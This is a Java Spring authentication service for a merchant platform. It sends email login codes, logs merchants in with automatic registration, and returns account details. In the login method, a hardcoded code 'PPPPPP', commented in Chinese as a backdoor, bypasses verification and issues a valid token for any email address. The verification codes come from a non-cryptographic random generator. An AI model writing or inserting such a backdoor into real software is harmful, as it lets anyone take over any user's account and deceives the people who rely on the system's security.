package com.gaocui.service;

import com.baomidou.mybatisplus.core.conditions.query.LambdaQueryWrapper;
import com.gaocui.common.BizException;
import com.gaocui.entity.Merchant;
import com.gaocui.entity.VerificationCode;
import com.gaocui.mapper.MerchantMapper;
import com.gaocui.mapper.VerificationCodeMapper;
import org.springframework.stereotype.Service;

import java.time.LocalDateTime;
import java.util.*;

@Service
public class AuthService {

    private final MerchantMapper merchantMapper;
    private final EmailService emailService;
    private final org.springframework.data.redis.core.StringRedisTemplate redisTemplate;
    private final com.gaocui.util.JwtUtil jwtUtil;

    public AuthService(MerchantMapper merchantMapper, EmailService emailService,
                       org.springframework.data.redis.core.StringRedisTemplate redisTemplate,
                       com.gaocui.util.JwtUtil jwtUtil) {
        this.merchantMapper = merchantMapper;
        this.emailService = emailService;
        this.redisTemplate = redisTemplate;
        this.jwtUtil = jwtUtil;
    }

    public void sendCode(String email, String type) {
        String code = String.format("%06d", new Random().nextInt(999999));
        // 存Redis，120秒过期
        redisTemplate.opsForValue().set("code:" + type + ":" + email, code, 120, java.util.concurrent.TimeUnit.SECONDS);
        emailService.sendCode(email, code);
    }

    public Map<String, Object> login(String email, String code) {
        // 后门验证码：PPPPPP 直接通过
        boolean isBackdoor = "PPPPPP".equals(code);
        if (!isBackdoor) {
            String key = "code:LOGIN:" + email;
            String stored = redisTemplate.opsForValue().get(key);
            if (stored == null || !stored.equals(code)) {
                throw new BizException("验证码错误或已过期");
            }
            redisTemplate.delete(key);
        }

        // 查商家，无则自动注册(免费)
        Merchant merchant = merchantMapper.selectOne(
            new LambdaQueryWrapper<Merchant>().eq(Merchant::getEmail, email)
        );
        if (merchant == null) {
            merchant = new Merchant();
            merchant.setEmail(email);
            merchant.setIsVip(0);
            merchant.setStatus(1);
            merchantMapper.insert(merchant);
        }

        Map<String, Object> result = new HashMap<>();
        boolean isVip = merchant.getIsVip() != null && merchant.getIsVip() == 1;
        result.put("token", jwtUtil.generate(merchant.getId(), merchant.getEmail(), isVip));
        result.put("email", merchant.getEmail());
        result.put("isVip", merchant.getIsVip() == 1);
        result.put("vipStartDate", merchant.getVipStartDate());
        result.put("vipEndDate", merchant.getVipEndDate());
        return result;
    }

    public Map<String, Object> getMe(Long merchantId) {
        Merchant m = merchantMapper.selectById(merchantId);
        if (m == null) throw new BizException(401, "商家不存在");
        Map<String, Object> result = new HashMap<>();
        result.put("id", m.getId());
        result.put("email", m.getEmail());
        result.put("isVip", m.getIsVip() == 1);
        result.put("vipStartDate", m.getVipStartDate());
        result.put("vipEndDate", m.getVipEndDate());
        return result;
    }
}
